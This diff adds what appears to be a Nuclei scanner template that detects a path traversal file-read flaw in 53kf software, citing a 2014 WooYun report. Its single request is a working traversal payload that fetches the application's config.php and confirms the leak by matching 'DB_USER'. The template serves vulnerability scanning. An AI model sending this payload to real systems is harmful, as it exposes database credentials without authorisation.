@@ -1,0 +1,24 @@
+id: 53kf-file-read
+
+info:
+  name: 53kf fileRead
+  author: Str1am    
+  severity: medium
+  description: 漏洞存在于/new/Client/Lib/Action/DownloadAction.class.php\n文件中，由于文件下载函数未限制文件类型及路径，导致攻击者可跨目录下载任意类型文件
+  reference: http://wooyun.org/bugs/wooyun-2014-086882
+  tags: 53kf,file_read
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/new/client.php?m=download&a=downloadFile&file=..%2F../new/Client/Conf/config.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "DB_USER"
+        part: body
+        condition: and
